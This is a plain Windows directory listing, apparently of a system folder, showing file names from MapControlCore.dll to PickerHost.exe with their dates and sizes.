09/15/2018  09:13 AM           218,112 MapControlCore.dll
09/15/2018  09:13 AM             2,560 MapControlStringsRes.dll
09/07/2019  02:20 AM         2,001,408 MapGeocoder.dll
09/15/2018  09:13 AM           119,808 mapi32.dll
09/15/2018  09:13 AM           119,808 mapistub.dll
09/07/2019  02:20 AM         2,447,360 MapRouter.dll
09/15/2018  09:13 AM            96,256 MapsBtSvc.dll
09/15/2018  09:13 AM            22,528 MapsTelemetry.dll
09/15/2018  11:08 AM           149,520 mavinject.exe
09/07/2019  02:20 AM           711,168 MbaeApi.dll
09/07/2019  02:20 AM           884,224 MbaeApiPublic.dll
09/15/2018  09:13 AM           474,624 mbsmsapi.dll
09/15/2018  09:13 AM            68,608 mbussdapi.dll
09/07/2019  02:20 AM            80,896 mcbuilder.exe
09/15/2018  09:13 AM            84,480 mciavi32.dll
09/15/2018  09:13 AM            38,400 mcicda.dll
09/15/2018  09:13 AM            38,400 mciqtz32.dll
09/15/2018  09:13 AM            24,064 mciseq.dll
09/15/2018  09:13 AM            25,088 mciwave.dll
09/15/2018  09:13 AM           850,432 MCRecvSrc.dll
09/15/2018  09:13 AM           161,792 mdminst.dll
09/15/2018  09:13 AM            46,592 mdmlocalmanagement.dll
09/07/2019  02:20 AM           201,728 mdmregistration.dll
09/15/2018  09:13 AM           858,112 MessagingDataModel2.dll
09/07/2019  02:20 AM           532,192 mf.dll
09/07/2019  02:20 AM            46,080 mf3216.dll
09/15/2018  09:12 AM           118,232 mfAACEnc.dll
09/07/2019  02:21 AM         1,289,192 mfasfsrcsnk.dll
09/15/2018  09:12 AM           140,288 mfaudiocnv.dll
02/10/2016  09:25 PM         4,424,352 mfc120.dll
02/10/2016  09:25 PM            46,248 mfc120chs.dll
02/10/2016  09:25 PM            46,248 mfc120cht.dll
02/10/2016  09:25 PM            74,920 mfc120deu.dll
02/10/2016  09:25 PM            65,192 mfc120enu.dll
02/10/2016  09:25 PM            73,896 mfc120esn.dll
02/10/2016  09:25 PM            74,920 mfc120fra.dll
02/10/2016  09:25 PM            72,872 mfc120ita.dll
02/10/2016  09:25 PM            53,928 mfc120jpn.dll
02/10/2016  09:25 PM            53,416 mfc120kor.dll
02/10/2016  09:25 PM            70,824 mfc120rus.dll
02/10/2016  09:25 PM         4,449,952 mfc120u.dll
05/14/2018  09:09 PM         4,876,064 mfc140.dll
05/14/2018  09:09 PM            46,744 mfc140chs.dll
05/14/2018  09:09 PM            46,744 mfc140cht.dll
05/14/2018  09:09 PM            75,408 mfc140deu.dll
05/14/2018  09:09 PM            65,680 mfc140enu.dll
05/14/2018  09:09 PM            74,392 mfc140esn.dll
05/14/2018  09:09 PM            75,416 mfc140fra.dll
05/14/2018  09:09 PM            73,360 mfc140ita.dll
05/14/2018  09:09 PM            54,936 mfc140jpn.dll
05/14/2018  09:09 PM            53,904 mfc140kor.dll
05/14/2018  09:09 PM            71,320 mfc140rus.dll
05/14/2018  09:09 PM         5,178,664 mfc140u.dll
09/15/2018  09:13 AM           924,944 mfc40.dll
09/15/2018  09:13 AM           924,944 mfc40u.dll
09/15/2018  09:12 AM         1,178,624 mfc42.dll
09/15/2018  09:12 AM         1,163,776 mfc42u.dll
09/15/2018  09:12 AM           464,808 MFCaptureEngine.dll
02/10/2016  09:25 PM            83,104 mfcm120.dll
02/10/2016  09:25 PM            83,104 mfcm120u.dll
05/14/2018  09:09 PM            92,968 mfcm140.dll
05/14/2018  09:09 PM            92,968 mfcm140u.dll
09/07/2019  02:21 AM         3,550,384 mfcore.dll
09/15/2018  09:13 AM            28,672 mfcsubs.dll
09/15/2018  09:12 AM           758,176 mfds.dll
09/15/2018  09:12 AM           171,520 mfdvdec.dll
09/15/2018  09:12 AM            70,656 mferror.dll
09/15/2018  09:12 AM            43,520 mfh263enc.dll
09/07/2019  02:21 AM           573,440 mfh264enc.dll
09/15/2018  09:13 AM           237,568 mfksproxy.dll
09/07/2019  02:21 AM         3,566,080 MFMediaEngine.dll
09/15/2018  09:12 AM            83,968 mfmjpegdec.dll
09/15/2018  09:12 AM           982,016 mfmkvsrcsnk.dll
09/07/2019  02:21 AM         1,706,488 mfmp4srcsnk.dll
09/07/2019  02:21 AM         1,024,920 mfmpeg2srcsnk.dll
09/15/2018  09:12 AM           918,000 mfnetcore.dll
09/15/2018  09:12 AM         1,288,896 mfnetsrc.dll
09/15/2018  09:12 AM         1,076,040 mfperfhelper.dll
09/07/2019  02:21 AM         1,604,760 mfplat.dll
09/15/2018  09:12 AM           466,376 MFPlay.dll
09/15/2018  09:12 AM            40,272 mfpmp.exe
09/15/2018  09:12 AM           127,040 mfps.dll
09/07/2019  02:21 AM           762,272 mfreadwrite.dll
09/15/2018  09:13 AM           294,368 mfsensorgroup.dll
09/15/2018  09:12 AM         1,418,824 mfsrcsnk.dll
09/07/2019  02:21 AM         1,075,832 mfsvr.dll
09/15/2018  09:12 AM           328,960 mftranscode.dll
09/15/2018  09:12 AM            81,712 mfvdsp.dll
09/15/2018  09:12 AM            37,888 mfvfw.dll
09/15/2018  09:12 AM           400,384 MFWMAAEC.DLL
09/15/2018  09:12 AM            18,944 mgmtapi.dll
09/15/2018  09:13 AM           102,912 mi.dll
09/15/2018  09:13 AM            73,216 mibincodec.dll
09/15/2018  09:13 AM           113,664 Microsoft-Windows-MapControls.dll
09/15/2018  09:13 AM             8,192 Microsoft-Windows-MosHost.dll
09/15/2018  09:13 AM           148,992 Microsoft.Bluetooth.Proxy.dll
09/15/2018  09:14 AM            14,336 Microsoft.Management.Infrastructure.Native.Unmanaged.dll
09/07/2019  02:20 AM         1,720,120 Microsoft.Uev.AppAgent.dll
09/15/2018  11:08 AM            36,352 Microsoft.Uev.Office2010CustomActions.dll
09/07/2019  02:20 AM           526,336 Microsoft.Uev.Office2013CustomActions.dll
09/07/2019  02:20 AM           165,888 MicrosoftAccountTokenProvider.dll
09/15/2018  09:13 AM           325,120 MicrosoftAccountWAMExtension.dll
09/15/2018  09:13 AM            18,944 midimap.dll
09/15/2018  09:11 AM           119,808 migisol.dll
04/13/2025  06:54 PM    <DIR>          migration
09/15/2018  09:13 AM           182,784 miguiresource.dll
09/15/2018  09:19 AM    <DIR>          migwiz
09/15/2018  09:13 AM            33,792 mimefilt.dll
09/15/2018  09:13 AM           119,296 mimofcodec.dll
09/15/2018  09:11 AM            12,288 MinstoreEvents.dll
09/15/2018  09:12 AM           232,448 mintdh.dll
09/15/2018  09:13 AM           902,144 MiracastReceiver.dll
09/15/2018  09:13 AM            32,768 MirrorDrvCompat.dll
09/07/2019  02:20 AM         2,942,976 mispace.dll
09/15/2018  09:13 AM            67,072 MitigationConfiguration.dll
09/15/2018  09:13 AM           192,000 miutils.dll
09/15/2018  09:12 AM           673,088 mlang.dat
09/15/2018  09:12 AM           198,656 mlang.dll
09/15/2018  09:13 AM         1,451,008 mmc.exe
09/15/2018  09:16 AM             3,103 mmc.exe.config
09/15/2018  09:13 AM           297,984 mmcbase.dll
09/15/2018  09:13 AM            55,296 mmci.dll
09/15/2018  09:13 AM            12,288 mmcico.dll
09/15/2018  09:13 AM         2,358,784 mmcndmgr.dll
09/15/2018  09:13 AM           113,664 mmcshext.dll
09/15/2018  09:12 AM           366,736 MMDevAPI.dll
09/15/2018  09:13 AM         1,625,600 mmgaclient.dll
09/15/2018  09:13 AM            62,976 mmgaproxystub.dll
09/15/2018  09:13 AM         1,111,552 mmgaserver.exe
09/15/2018  09:13 AM             3,584 mmres.dll
09/07/2019  02:20 AM           908,800 mmsys.cpl
09/15/2018  09:13 AM            16,896 mobilenetworking.dll
09/15/2018  09:13 AM            93,184 mobsync.exe
09/15/2018  09:11 AM            26,624 mode.com
09/15/2018  09:13 AM           169,984 modemui.dll
09/15/2018  09:11 AM            24,576 more.com
09/15/2018  09:13 AM           185,344 moricons.dll
09/15/2018  09:13 AM            68,096 MosHostClient.dll
09/15/2018  09:13 AM            68,096 MosStorage.dll
09/15/2018  09:11 AM            15,360 mountvol.exe
09/15/2018  09:12 AM            91,560 MP3DMOD.DLL
09/15/2018  09:12 AM           264,936 MP43DECD.DLL
09/15/2018  09:12 AM           345,152 MP4SDECD.DLL
09/15/2018  09:13 AM            76,800 Mpeg2Data.ax
09/15/2018  09:13 AM           206,336 mpg2splt.ax
09/15/2018  09:12 AM           264,936 MPG4DECD.DLL
09/07/2019  02:20 AM            89,336 mpr.dll
09/15/2018  09:13 AM           445,952 mprapi.dll
09/07/2019  02:20 AM           763,392 mprddm.dll
09/15/2018  09:13 AM           404,480 mprdim.dll
09/15/2018  09:12 AM            12,288 mprext.dll
09/15/2018  09:13 AM           113,152 mprmsg.dll
09/15/2018  09:13 AM         1,088,512 mprsnap.dll
09/15/2018  09:12 AM            14,336 MRINFO.EXE
09/15/2018  09:13 AM           864,624 MrmCoreR.dll
09/15/2018  09:13 AM           313,160 MrmDeploy.dll
09/15/2018  09:13 AM           673,280 MrmIndexer.dll
09/15/2018  09:13 AM            28,320 mrt100.dll
09/15/2018  09:13 AM            30,368 mrt_map.dll
09/15/2018  09:13 AM            43,520 ms3dthumbnailprovider.dll
09/15/2018  09:13 AM           121,344 msaatext.dll
09/15/2018  09:13 AM            93,984 msacm32.dll
09/15/2018  09:13 AM            23,552 msacm32.drv
09/15/2018  09:13 AM            29,920 msadp32.acm
09/15/2018  09:12 AM             2,560 msafd.dll
09/15/2018  09:13 AM         2,523,136 MSAJApi.dll
09/15/2018  09:12 AM            46,592 MSAlacDecoder.dll
09/15/2018  09:12 AM            57,856 MSAlacEncoder.dll
09/15/2018  09:12 AM           125,952 MSAMRNBDecoder.dll
09/15/2018  09:12 AM           199,680 MSAMRNBEncoder.dll
09/15/2018  09:12 AM            22,528 MSAMRNBSink.dll
09/15/2018  09:12 AM            87,552 MSAMRNBSource.dll
09/15/2018  09:12 AM            50,608 msasn1.dll
09/15/2018  09:12 AM           461,184 MSAudDecMFT.dll
09/15/2018  09:11 AM           155,136 msaudite.dll
09/15/2018  09:13 AM            18,944 msauserext.dll
09/15/2018  09:12 AM           235,520 mscandui.dll
09/15/2018  09:12 AM            11,776 mscat32.dll
09/15/2018  09:16 AM           207,872 msclmd.dll
09/15/2018  09:13 AM           606,208 mscms.dll
09/15/2018  09:11 AM           315,904 mscoree.dll
09/15/2018  09:11 AM            19,968 mscorier.dll
09/15/2018  09:11 AM            81,544 mscories.dll
09/15/2018  09:12 AM             2,560 mscpx32r.dLL
09/15/2018  09:12 AM            14,848 mscpxl32.dLL
09/07/2019  02:20 AM         1,294,280 msctf.dll
09/15/2018  09:12 AM             8,704 msctfime.ime
09/15/2018  09:12 AM            70,144 MsCtfMonitor.dll
09/15/2018  09:12 AM            91,136 msctfp.dll
09/15/2018  09:12 AM            87,040 msctfui.dll
09/15/2018  09:12 AM         1,804,288 msctfuimanager.dll
09/15/2018  09:13 AM           147,456 msdadiag.dll
09/15/2018  09:12 AM           121,856 msdart.dll
09/15/2018  09:12 AM             5,120 msdatsrc.tlb
09/15/2018  09:11 AM           401,720 msdelta.dll
09/15/2018  09:13 AM            29,112 msdmo.dll
09/15/2018  09:19 AM    <DIR>          MSDRM
09/15/2018  09:13 AM           439,296 msdrm.dll
09/15/2018  09:13 AM         1,501,184 msdt.exe
09/15/2018  09:19 AM    <DIR>          Msdtc
09/15/2018  09:11 AM           726,016 msdtcprx.dll
09/15/2018  09:11 AM            12,288 msdtcspoffln.dll
09/15/2018  09:12 AM           265,216 msdtcuiu.dll
09/15/2018  09:11 AM            22,528 msdtcVSp1res.dll
09/15/2018  09:13 AM            67,072 MSDvbNP.ax
09/15/2018  11:06 AM             5,632 msdxm.ocx
09/15/2018  11:06 AM            44,032 msdxm.tlb
09/15/2018  09:13 AM           409,600 msexch40.dll
09/07/2019  02:20 AM           341,504 msexcl40.dll
09/07/2019  02:20 AM           669,184 msfeeds.dll
09/15/2018  09:13 AM            64,000 msfeedsbs.dll
09/15/2018  09:13 AM            13,824 msfeedssync.exe
09/07/2019  02:21 AM           371,712 MSFlacDecoder.dll
09/15/2018  09:12 AM           231,424 MSFlacEncoder.dll
09/15/2018  09:12 AM         2,770,944 msftedit.dll
09/15/2018  09:11 AM            22,528 msg.exe
09/15/2018  09:13 AM            22,720 msg711.acm
09/15/2018  09:13 AM            36,136 msgsm32.acm
09/15/2018  09:12 AM            28,672 MSHEIF.dll
09/15/2018  09:13 AM            13,312 mshta.exe
09/07/2019  02:20 AM        19,011,584 mshtml.dll
09/15/2018  09:13 AM         2,755,584 mshtml.tlb
09/15/2018  09:13 AM            63,488 MshtmlDac.dll
09/15/2018  09:13 AM            78,336 mshtmled.dll
09/15/2018  09:13 AM            49,152 mshtmler.dll
09/07/2019  02:20 AM         3,906,560 msi.dll
09/15/2018  09:13 AM            13,312 msidcrl40.dll
09/15/2018  09:13 AM            51,200 msident.dll
09/15/2018  09:13 AM             9,728 msidle.dll
09/15/2018  09:13 AM             5,120 msidntld.dll
09/15/2018  09:13 AM           282,112 msieftp.dll
09/07/2019  02:20 AM            59,904 msiexec.exe
09/15/2018  09:13 AM           323,584 msihnd.dll
09/15/2018  09:13 AM            17,408 msiltcfg.dll
09/15/2018  09:12 AM             6,656 msimg32.dll
09/15/2018  09:13 AM            26,112 msimsg.dll
09/15/2018  09:12 AM            38,400 msimtf.dll
09/15/2018  09:11 AM           335,360 msinfo32.exe
09/07/2019  02:20 AM            24,064 msisip.dll
09/07/2019  02:20 AM           260,096 msIso.dll
09/15/2018  09:13 AM             9,728 msiwer.dll
09/07/2019  02:20 AM         1,312,256 msjet40.dll
09/15/2018  09:13 AM           518,144 msjetoledb40.dll
09/15/2018  09:12 AM             8,704 msjint40.dll
09/15/2018  09:12 AM            83,968 msjter40.dll
09/15/2018  09:12 AM           290,816 msjtes40.dll
09/15/2018  09:13 AM           135,168 mskeyprotcli.dll
09/15/2018  09:12 AM            49,152 mskeyprotect.dll
09/15/2018  09:12 AM           184,320 msls31.dll
09/07/2019  02:20 AM           241,152 msltus40.dll
09/15/2018  09:12 AM           848,896 MSMPEG2ENC.DLL
09/07/2019  02:21 AM         2,323,696 msmpeg2vdec.dll
09/15/2018  09:13 AM           214,528 MSNP.ax
09/15/2018  09:11 AM            63,488 msobjs.dll
01/31/2024  11:52 PM            80,944 msodbcdiag17.dll
01/31/2024  11:52 PM         1,563,576 msodbcsql17.dll
09/15/2018  09:13 AM            97,792 msoert2.dll
05/03/2024  07:38 PM         2,512,904 msoledbsql.dll
09/15/2018  09:12 AM           135,680 MSOpusDecoder.dll
09/15/2018  09:12 AM             2,560 msorc32r.dll
09/15/2018  09:12 AM           160,256 msorcl32.dll
09/15/2018  09:13 AM         6,579,200 mspaint.exe
09/15/2018  09:11 AM            44,560 mspatcha.dll
09/15/2018  09:11 AM            64,000 mspatchc.dll
09/07/2019  02:20 AM           376,320 mspbde40.dll
09/15/2018  09:12 AM         1,340,416 MSPhotography.dll
09/15/2018  09:13 AM            45,056 msports.dll
09/15/2018  09:13 AM            10,240 msrating.dll
09/07/2019  02:20 AM           313,344 msrd2x40.dll
09/07/2019  02:20 AM           353,280 msrd3x40.dll
09/15/2018  09:13 AM            51,200 MsRdpWebAccess.dll
09/15/2018  09:13 AM           616,448 msrepl40.dll
09/15/2018  09:13 AM            14,336 msrle32.dll
09/15/2018  09:13 AM            42,496 msscntrs.dll
09/15/2018  09:12 AM           101,376 msscript.ocx
09/15/2018  09:12 AM            59,904 mssign32.dll
09/15/2018  09:13 AM             9,216 mssip32.dll
09/15/2018  09:13 AM           113,152 mssitlb.dll
09/15/2018  09:14 AM           727,040 MsSpellCheckingFacility.dll
09/07/2019  02:20 AM           144,384 mssph.dll
09/15/2018  09:13 AM            59,904 mssprxy.dll
09/07/2019  02:20 AM         2,346,496 mssrch.dll
09/07/2019  02:20 AM           729,088 mssvp.dll
09/15/2018  09:13 AM           221,696 mstask.dll
09/15/2018  09:13 AM           272,896 mstext40.dll
09/07/2019  02:20 AM         3,421,696 mstsc.exe
09/07/2019  02:20 AM         7,921,664 mstscax.dll
09/15/2018  09:13 AM           141,824 mstsmhst.dll
09/15/2018  09:13 AM           268,288 mstsmmc.dll
09/15/2018  09:12 AM           413,696 msutb.dll
09/07/2019  02:20 AM           386,576 msv1_0.dll
09/15/2018  09:13 AM         1,386,496 msvbvm60.dll
09/15/2018  09:11 AM            64,512 msvcirt.dll
02/19/2011  11:03 PM           421,200 msvcp100.dll
09/15/2018  09:11 AM           414,968 msvcp110_win.dll
09/15/2018  09:14 AM           485,576 msvcp120_clr0400.dll
09/27/2019  08:04 PM           450,320 msvcp140.dll
09/27/2019  08:04 PM            28,952 msvcp140_1.dll
09/27/2019  08:04 PM           173,336 msvcp140_2.dll
09/27/2019  08:04 PM            26,392 msvcp140_codecvt_ids.dll
09/15/2018  09:11 AM           446,976 msvcp60.dll
09/15/2018  09:12 AM           516,496 msvcp_win.dll
02/19/2011  12:40 AM           773,968 msvcr100.dll
09/15/2018  09:14 AM            19,080 msvcr100_clr0400.dll
09/15/2018  09:14 AM           987,840 msvcr120_clr0400.dll
09/07/2019  02:20 AM           780,632 msvcrt.dll
09/15/2018  09:13 AM           253,952 msvcrt20.dll
09/15/2018  09:11 AM            60,928 msvcrt40.dll
09/15/2018  09:13 AM           124,928 msvfw32.dll
09/15/2018  09:13 AM            33,280 msvidc32.dll
09/07/2019  02:20 AM         2,205,184 MSVidCtl.dll
09/15/2018  09:12 AM           575,896 MSVideoDSP.dll
09/07/2019  02:21 AM         1,297,120 msvproc.dll
09/15/2018  09:13 AM           200,360 MSWB7.dll
09/15/2018  09:12 AM           866,816 mswdat10.dll
09/15/2018  09:12 AM            27,648 MSWebp.dll
09/15/2018  09:12 AM           352,256 mswmdm.dll
09/07/2019  02:20 AM           324,408 mswsock.dll
09/15/2018  09:12 AM           640,512 mswstr10.dll
09/07/2019  02:20 AM           475,648 msxbde40.dll
09/07/2019  02:20 AM         1,496,576 msxml3.dll
09/15/2018  09:13 AM             2,560 msxml3r.dll
09/07/2019  02:20 AM         2,022,096 msxml6.dll
09/15/2018  09:13 AM             2,560 msxml6r.dll
09/15/2018  09:13 AM            24,064 msyuv.dll
09/07/2019  02:20 AM           202,552 MTF.dll
09/15/2018  09:13 AM           115,200 mtstocom.exe
09/15/2018  09:11 AM           369,152 mtxclu.dll
09/15/2018  09:13 AM            26,624 mtxdm.dll
09/15/2018  09:13 AM             8,192 mtxex.dll
09/15/2018  09:13 AM            31,232 mtxlegih.dll
09/15/2018  09:11 AM           116,224 mtxoci.dll
09/15/2018  11:06 AM    <DIR>          MUI
09/15/2018  09:12 AM            14,848 muifontsetup.dll
09/15/2018  09:13 AM            83,968 MuiUnattend.exe
09/15/2018  09:13 AM           224,768 mycomput.dll
09/15/2018  09:13 AM           151,552 mydocs.dll
09/15/2018  09:13 AM            44,032 NAPCRYPT.DLL
09/15/2018  09:13 AM            54,784 NapiNSP.dll
09/15/2018  09:13 AM           825,344 NaturalLanguage6.dll
09/15/2018  11:06 AM    <DIR>          nb-NO
09/15/2018  09:12 AM            19,968 NcaApi.dll
09/15/2018  09:13 AM            20,480 NcdProp.dll
09/15/2018  09:13 AM            33,280 nci.dll
09/15/2018  09:13 AM            55,808 ncobjapi.dll
09/15/2018  09:13 AM           100,864 ncpa.cpl
09/15/2018  09:12 AM           127,592 ncrypt.dll
09/07/2019  02:20 AM           281,600 ncryptprov.dll
09/15/2018  09:12 AM           115,880 ncryptsslp.dll
09/15/2018  09:13 AM            65,536 ndadmin.exe
09/15/2018  09:13 AM            10,752 nddeapi.dll
09/15/2018  09:19 AM    <DIR>          NDF
09/15/2018  09:12 AM           245,248 ndfapi.dll
09/15/2018  09:12 AM            34,816 ndfetw.dll
09/15/2018  09:12 AM               565 NdfEventView.xml
09/15/2018  09:12 AM            81,920 ndfhcdiscovery.dll
09/15/2018  09:13 AM            77,312 ndishc.dll
09/15/2018  09:12 AM            21,504 ndproxystub.dll
09/07/2019  02:20 AM           100,864 negoexts.dll
09/15/2018  09:12 AM            47,104 net.exe
09/15/2018  09:12 AM           140,800 net1.exe
09/15/2018  09:12 AM            68,680 netapi32.dll
09/15/2018  09:12 AM            15,360 netbios.dll
09/15/2018  09:12 AM            22,016 netbtugc.exe
09/15/2018  09:13 AM         1,171,456 netcenter.dll
09/15/2018  09:13 AM            58,880 NetCfgNotifyObjectHost.exe
09/15/2018  09:13 AM            76,600 netcfgx.dll
09/15/2018  09:13 AM           335,360 netcorehc.dll
09/15/2018  09:12 AM           236,544 netdiagfx.dll
09/07/2019  02:21 AM            73,728 netdom.exe
09/15/2018  09:12 AM            81,408 NetDriverInstall.dll
09/15/2018  09:13 AM            20,480 netevent.dll
09/15/2018  09:11 AM            90,624 netfxperf.dll
09/15/2018  09:12 AM             2,560 neth.dll
09/15/2018  09:13 AM           128,512 netid.dll
09/07/2019  02:20 AM           155,648 netiohlp.dll
09/15/2018  09:13 AM            25,088 netiougc.exe
09/15/2018  09:12 AM           140,288 netjoin.dll
09/07/2019  02:20 AM           664,576 netlogon.dll
09/15/2018  09:12 AM             2,560 netmsg.dll
09/15/2018  09:13 AM           223,744 netplwiz.dll
09/15/2018  09:13 AM            34,816 Netplwiz.exe
09/15/2018  09:13 AM           178,176 netprofm.dll
09/15/2018  09:12 AM            52,736 netprovfw.dll
09/15/2018  09:12 AM            56,832 netprovisionsp.dll
09/07/2019  02:20 AM           107,832 NetSetupApi.dll
09/07/2019  02:20 AM           598,544 NetSetupEngine.dll
09/07/2019  02:20 AM           370,688 NetSetupShim.dll
09/15/2018  09:12 AM            82,432 netsh.exe
09/15/2018  09:13 AM         2,707,968 netshell.dll
09/15/2018  09:12 AM            32,768 NETSTAT.EXE
09/15/2018  09:12 AM            37,160 netutils.dll
09/15/2018  09:13 AM           481,280 NetworkCollectionAgent.dll
09/15/2018  09:12 AM         1,182,208 networkexplorer.dll
09/15/2018  09:12 AM            43,008 networkitemfactory.dll
09/15/2018  09:19 AM    <DIR>          networklist
09/07/2019  02:20 AM           487,424 newdev.dll
09/15/2018  09:13 AM            67,584 newdev.exe
09/07/2019  02:20 AM           439,808 ngccredprov.dll
09/15/2018  09:13 AM           144,384 ngckeyenum.dll
09/15/2018  09:13 AM            86,016 ngcksp.dll
09/15/2018  09:13 AM            53,760 ngclocal.dll
09/15/2018  09:12 AM           322,560 ninput.dll
09/15/2018  11:06 AM    <DIR>          nl-NL
09/07/2019  02:20 AM            70,144 nlaapi.dll
09/15/2018  09:13 AM           152,576 nlhtml.dll
09/15/2018  09:13 AM           154,624 nlmgp.dll
09/15/2018  09:13 AM            18,432 nlmproxy.dll
09/15/2018  09:13 AM            14,336 nlmsprep.dll
09/15/2018  09:13 AM            89,600 nlsbres.dll
09/15/2018  09:13 AM         1,518,592 NlsData0000.dll
09/14/2018  07:34 PM         5,489,664 NlsData0009.dll
09/15/2018  09:13 AM             8,704 Nlsdl.dll
09/07/2019  02:20 AM           424,448 nltest.exe
09/15/2018  09:13 AM           195,072 NmaDirect.dll
09/15/2018  09:16 AM               741 NOISE.DAT
09/15/2018  09:13 AM             5,120 normaliz.dll
09/07/2019  02:20 AM           240,128 notepad.exe
09/07/2019  02:20 AM            21,504 npmproxy.dll
09/15/2018  09:13 AM           157,696 NPSM.dll
09/15/2018  09:13 AM           821,760 NPSMDesktopProvider.dll
09/07/2019  02:20 AM            36,352 nshhttp.dll
09/15/2018  09:12 AM           332,800 nshipsec.dll
09/07/2019  02:20 AM           607,744 nshwfp.dll
09/15/2018  09:12 AM            20,144 nsi.dll
09/07/2019  02:20 AM            77,824 nslookup.exe
09/15/2018  09:12 AM           177,312 ntasn1.dll
09/07/2019  02:20 AM         1,674,480 ntdll.dll
09/15/2018  09:12 AM            97,792 ntdsapi.dll
09/07/2019  02:20 AM            57,344 ntlanman.dll
09/15/2018  09:13 AM            17,408 ntlanui2.dll
09/07/2019  02:20 AM            33,056 NtlmShared.dll
09/15/2018  09:12 AM           153,408 ntmarta.dll
09/15/2018  09:12 AM           317,440 ntprint.dll
09/15/2018  09:12 AM            61,952 ntprint.exe
09/07/2019  02:20 AM           671,232 ntshrui.dll
09/15/2018  09:11 AM            16,384 ntvdm64.dll
09/07/2019  02:20 AM           556,544 objsel.dll
09/15/2018  09:13 AM           127,488 occache.dll
09/15/2018  09:11 AM           165,888 ocsetapi.dll
09/15/2018  09:13 AM           605,184 odbc32.dll
09/15/2018  09:12 AM            72,192 odbcad32.exe
09/15/2018  09:12 AM            39,936 odbcbcp.dll
09/15/2018  09:13 AM            24,064 odbcconf.dll
09/15/2018  09:12 AM            22,016 odbcconf.exe
09/15/2018  09:12 AM             4,453 odbcconf.rsp
09/15/2018  09:13 AM           110,592 odbccp32.dll
09/15/2018  09:12 AM            69,632 odbccr32.dll
09/15/2018  09:12 AM            70,656 odbccu32.dll
09/15/2018  09:12 AM           225,280 odbcint.dll
09/15/2018  09:12 AM            10,240 odbcji32.dll
09/15/2018  09:12 AM           318,464 odbcjt32.dll
09/15/2018  09:12 AM           128,000 odbctrac.dll
09/15/2018  09:12 AM             8,704 oddbse32.dll
09/15/2018  09:12 AM             8,704 odexl32.dll
09/15/2018  09:12 AM             8,704 odfox32.dll
09/15/2018  09:12 AM             8,704 odpdx32.dll
09/15/2018  09:12 AM             8,704 odtext32.dll
09/15/2018  09:13 AM            96,256 oemlicense.dll
09/15/2018  09:13 AM           220,672 offfilt.dll
09/15/2018  09:12 AM           116,024 offlinelsa.dll
09/15/2018  09:12 AM           222,008 offlinesam.dll
09/07/2019  02:20 AM            58,880 offreg.dll
09/15/2018  09:13 AM             8,960 ole2.dll
09/15/2018  09:13 AM             8,960 ole2disp.dll
09/15/2018  09:13 AM             8,960 ole2nls.dll
09/07/2019  02:20 AM         1,026,792 ole32.dll
09/15/2018  09:12 AM           324,608 oleacc.dll
09/15/2018  09:12 AM            10,240 oleacchooks.dll
09/15/2018  09:12 AM             4,608 oleaccrc.dll
09/07/2019  02:20 AM           603,784 oleaut32.dll
09/15/2018  09:13 AM           107,520 olecli32.dll
09/15/2018  09:13 AM           148,992 oledlg.dll
09/07/2019  02:21 AM           115,200 oleprn.dll
09/07/2019  02:20 AM            88,576 olepro32.dll
09/15/2018  09:13 AM            57,344 olesvr32.dll
09/15/2018  09:13 AM           106,496 olethk32.dll
09/15/2018  09:13 AM           128,616 omadmapi.dll
09/15/2018  09:13 AM            37,376 OnDemandBrokerClient.dll
09/15/2018  09:13 AM            52,224 OnDemandConnRouteHelper.dll
09/15/2018  09:13 AM           210,944 OneCoreCommonProxyStub.dll
09/07/2019  02:20 AM         3,652,656 OneCoreUAPCommonProxyStub.dll
09/07/2019  02:20 AM           528,384 OneDriveSettingSyncProvider.dll
09/15/2018  09:13 AM           205,312 onex.dll
09/07/2019  02:22 AM    <DIR>          oobe
09/15/2018  09:13 AM         1,607,168 OpcServices.dll
09/15/2018  09:16 AM            23,552 opencl.dll
09/15/2018  09:11 AM            60,416 openfiles.exe
09/15/2018  09:13 AM           755,200 opengl32.dll
09/07/2019  02:20 AM           106,048 OpenWith.exe
09/15/2018  09:13 AM            43,520 OposHost.exe
09/15/2018  09:13 AM           753,608 ortcengine.dll
09/15/2018  09:13 AM            21,504 osbaseln.dll
09/15/2018  09:11 AM             8,192 osuninst.dll
09/15/2018  09:13 AM            29,696 PackagedCWALauncher.exe
09/15/2018  09:13 AM            80,384 packager.dll
09/15/2018  09:13 AM           168,448 PackageStateRoaming.dll
09/15/2018  09:13 AM            12,288 panmap.dll
09/15/2018  09:13 AM            38,184 PasswordOnWakeSettingFlyout.exe
09/15/2018  09:12 AM            16,896 PATHPING.EXE
09/15/2018  09:13 AM            53,760 pautoenr.dll
09/15/2018  09:13 AM           707,072 PayloadRestrictions.dll
09/15/2018  09:13 AM            15,872 PaymentMediatorServiceProxy.dll
09/15/2018  09:13 AM            53,248 pcacli.dll
09/15/2018  09:13 AM            78,336 pcaui.dll
09/15/2018  09:13 AM           130,560 pcaui.exe
09/15/2018  09:13 AM               150 pcl.sep
09/15/2018  09:11 AM           659,008 PCPKsp.dll
09/15/2018  09:13 AM            18,432 PCShellCommonProxyStub.dll
09/15/2018  09:12 AM            26,032 pcwum.dll
09/15/2018  09:13 AM           260,608 pdh.dll
09/15/2018  09:13 AM            47,616 pdhui.dll
09/07/2019  02:20 AM           349,696 PeerDistSh.dll
09/15/2018  09:13 AM            87,552 PeopleAPIs.dll
09/24/2019  03:09 PM           122,472 perf-MSSQL$SQLEXPRESS-sqlctr15.0.2000.5.dll
09/24/2019  03:09 PM            73,312 perf-MSSQL15.SQLEXPRESS-sqlagtctr.dll
09/15/2018  09:12 AM            41,472 perfctrs.dll
09/15/2018  09:12 AM            37,376 perfdisk.dll
09/15/2018  09:11 AM            21,504 perfhost.exe
09/15/2018  09:13 AM           162,816 perfmon.exe
09/15/2018  09:13 AM           145,519 perfmon.msc
09/15/2018  09:12 AM            22,016 perfnet.dll
09/15/2018  09:12 AM            35,328 perfos.dll
09/07/2019  02:20 AM            36,352 perfproc.dll
04/13/2025  06:57 PM           977,932 PerfStringBackup.INI
09/07/2019  02:20 AM            32,768 perfts.dll
09/15/2018  09:13 AM           156,672 PersonaX.dll
09/15/2018  09:13 AM           179,200 PhoneCallHistoryApis.dll
09/15/2018  09:13 AM           348,672 PhoneOm.dll
09/15/2018  09:13 AM            78,336 PhonePlatformAbstraction.dll
09/15/2018  09:13 AM           310,784 Phoneutil.dll
09/15/2018  09:13 AM             2,560 PhoneutilRes.dll
09/07/2019  02:20 AM           403,968 PhotoMetadataHandler.dll
09/15/2018  09:13 AM           503,808 PhotoScreensaver.scr
09/15/2018  09:13 AM           284,160 photowiz.dll
09/15/2018  09:13 AM            94,496 PickerHost.exe
